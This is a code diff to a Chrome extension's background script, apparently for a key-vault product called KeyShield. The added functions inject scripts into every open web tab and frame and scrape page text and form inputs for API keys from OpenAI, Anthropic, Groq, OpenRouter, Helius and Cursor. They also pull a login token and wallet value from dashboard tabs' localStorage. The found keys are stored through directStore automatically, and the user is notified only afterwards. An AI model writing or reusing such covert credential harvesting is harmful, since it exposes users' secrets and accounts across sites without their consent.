@@ -874,24 +874,161 @@ chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => 
   return false;
 });
 
-async function injectDetectOnAllTabs() {
-  if (!chrome.scripting || !chrome.tabs) return { injected: 0 };
+function isHeliusDashboardHost(hostname) {
+  const host = String(hostname || '').toLowerCase().replace(/\.+$/, '');
+  return host === 'dashboard.helius.dev' || host === 'helius.dev' || host.endsWith('.helius.dev')
+    || host === 'helius.xyz' || host.endsWith('.helius.xyz');
+}
+
+function harvestVisibleKeysFromText(text, hostname, href) {
+  const src = String(text || '');
+  const host = String(hostname || '').toLowerCase();
+  const pageHref = String(href || '');
+  const skipUuid = new Set(
+    (pageHref.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi) || [])
+      .map((s) => s.toLowerCase()),
+  );
+  const shapes = [
+    { upstream: 'openrouter', re: /sk-or-[A-Za-z0-9_-]{12,}/g },
+    { upstream: 'anthropic', re: /sk-ant-api\d{2}-[A-Za-z0-9_-]{40,}/g },
+    { upstream: 'groq', re: /gsk_[A-Za-z0-9]{32,}/g },
+    { upstream: 'helius', re: /helius_auth_[A-Za-z0-9]{16,}/g },
+    { upstream: 'helius', re: /(?<![0-9a-f-])[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(?![0-9a-f-])/gi },
+    { upstream: 'cursor', re: /(?:key_|crsr[_-])[A-Za-z0-9_-]{12,}/g },
+    { upstream: 'openai', re: /sk-(?:proj-|svcacct-|admin-)?(?!or-|ant-)[A-Za-z0-9_-]{20,}/g },
+  ];
+  const out = [];
+  const seen = new Set();
+  for (const row of shapes) {
+    row.re.lastIndex = 0;
+    let match;
+    while ((match = row.re.exec(src)) !== null) {
+      const key = match[0];
+      if (!key || /[•…]|\.{3}/.test(key)) continue;
+      if (row.upstream === 'helius' && key.includes('-')) {
+        if (!isHeliusDashboardHost(host)) continue;
+        if (skipUuid.has(key.toLowerCase())) continue;
+      }
+      const id = `${row.upstream}:${key}`;
+      if (seen.has(id)) continue;
+      seen.add(id);
+      out.push({ upstream: row.upstream, key });
+    }
+  }
+  return out;
+}
+
+async function harvestTokenFromDashboardTabs() {
+  if (!chrome.scripting || !chrome.tabs) return null;
   let tabs = [];
-  try { tabs = await chrome.tabs.query({}); } catch { return { injected: 0 }; }
+  try {
+    tabs = await chrome.tabs.query({
+      url: [
+        'https://app.ks.aileena.xyz/*',
+        'https://*.aileena.xyz/*',
+        'http://127.0.0.1:5173/*',
+        'http://localhost:5173/*',
+      ],
+    });
+  } catch {
+    try { tabs = await chrome.tabs.query({}); } catch { return null; }
+  }
+  for (const tab of tabs) {
+    if (!tab.id || !tab.url) continue;
+    if (!/ks\.aileena\.xyz|127\.0\.0\.1:5173|localhost:5173/.test(tab.url)) continue;
+    try {
+      const injected = await chrome.scripting.executeScript({
+        target: { tabId: tab.id },
+        func: () => ({
+          token: localStorage.getItem('ks_token') || '',
+          user: localStorage.getItem('ks_wallet') || localStorage.getItem('ks_passkey_user') || '',
+        }),
+      });
+      const result = injected && injected[0] && injected[0].result;
+      if (result && String(result.token || '').trim().length >= 12) {
+        await chrome.storage.local.set({
+          ks_token: result.token,
+          ks_user: result.user || null,
+          ks_auto_store: true,
+        });
+        return result.token;
+      }
+    } catch { /* restricted tab */ }
+  }
+  return null;
+}
+
+function collectPageSecrets() {
+  const chunks = [];
+  try { chunks.push(document.body ? document.body.innerText : ''); } catch (e) { /* noop */ }
+  try {
+    document.querySelectorAll('input, textarea, code, pre').forEach((el) => {
+      chunks.push(el.value || el.textContent || '');
+    });
+  } catch (e) { /* noop */ }
+  return {
+    text: chunks.join('\n'),
+    hostname: location.hostname,
+    href: location.href,
+    stalePanel: !!document.getElementById('keyshield-detection-notice'),
+  };
+}
+
+function stripStaleDetectPanel() {
+  document.querySelectorAll('#keyshield-detection-notice').forEach((el) => el.remove());
+}
+
+async function injectDetectOnAllTabs() {
+  if (!chrome.scripting || !chrome.tabs) return { injected: 0, saved: 0, failed: 0 };
+  const stored = await getStoredToken();
+  if (!stored.token) await harvestTokenFromDashboardTabs();
+  const again = await getStoredToken();
+  if (again.token) {
+    try { await chrome.storage.local.set({ ks_auto_store: true }); } catch { /* noop */ }
+  }
+  let tabs = [];
+  try { tabs = await chrome.tabs.query({}); } catch { return { injected: 0, saved: 0, failed: 0 }; }
   let injected = 0;
+  let saved = 0;
+  let failed = 0;
   for (const tab of tabs) {
     if (!tab.id || !tab.url || !/^https?:/i.test(tab.url)) continue;
+    let page = null;
+    try {
+      const scraped = await chrome.scripting.executeScript({
+        target: { tabId: tab.id, allFrames: true },
+        func: collectPageSecrets,
+      });
+      page = (scraped || []).map((row) => row && row.result).filter(Boolean)[0] || null;
+    } catch { /* restricted */ }
+    if (page && again.token) {
+      const keys = harvestVisibleKeysFromText(page.text, page.hostname, page.href);
+      for (const hit of keys) {
+        const result = await directStore({ upstream: hit.upstream, value: hit.key });
+        if (result && result.ok) saved += 1;
+        else failed += 1;
+      }
+    }
     try {
       await chrome.scripting.executeScript({
         target: { tabId: tab.id, allFrames: true },
         files: ['content.js'],
       });
       injected += 1;
-    } catch {
-      /* chrome://, Web Store, and other restricted pages */
+    } catch { /* chrome://, Web Store */ }
+    if (page && page.stalePanel) {
+      try {
+        await chrome.scripting.executeScript({
+          target: { tabId: tab.id, allFrames: true },
+          func: stripStaleDetectPanel,
+        });
+      } catch { /* noop */ }
     }
   }
-  return { injected };
+  if (saved > 0) {
+    try { notify('KeyShield', `Saved ${saved} key${saved === 1 ? '' : 's'} to KeyShield vault`); } catch { /* noop */ }
+  }
+  return { injected, saved, failed };
 }
 
 if (chrome.tabs && chrome.tabs.onUpdated) {
